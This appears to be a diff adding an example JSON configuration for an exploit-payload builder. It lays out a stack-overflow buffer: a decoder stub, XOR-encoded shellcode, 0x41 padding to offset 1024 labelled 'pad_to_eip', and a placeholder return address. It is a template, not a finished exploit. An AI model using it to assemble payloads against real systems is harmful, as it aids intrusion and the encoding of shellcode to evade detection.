@@ -1,0 +1,36 @@
+{
+  "_comment": "Example showing a custom computed segment for encoding.",
+  "_comment2": "Register your encoder in computed_registry.py, then reference it here.",
+  "_comment3": "The builder loads sc.bin, runs it through your encoder function,",
+  "_comment4": "and inserts the resulting bytes — all in pure Python, no subprocess.",
+
+  "segments": [
+    {
+      "name": "decoder_stub",
+      "bytes_file": "decoder_stub.bin",
+      "_comment": "Your decoder stub that will decode the encoded shellcode at runtime"
+    },
+    {
+      "name": "encoded_shellcode",
+      "computed": {
+        "function": "xor_encoder",
+        "args": {
+          "key": "0x42",
+          "size": 128
+        }
+      },
+      "_comment": "xor_encoder is built-in. Replace with your own registered function."
+    },
+    {
+      "name": "pad_to_eip",
+      "pad_to_offset": 1024,
+      "pad_byte": "0x41"
+    },
+    {
+      "name": "ret",
+      "value": "0xdeadbeef",
+      "width": 4,
+      "endian": "little"
+    }
+  ]
+}
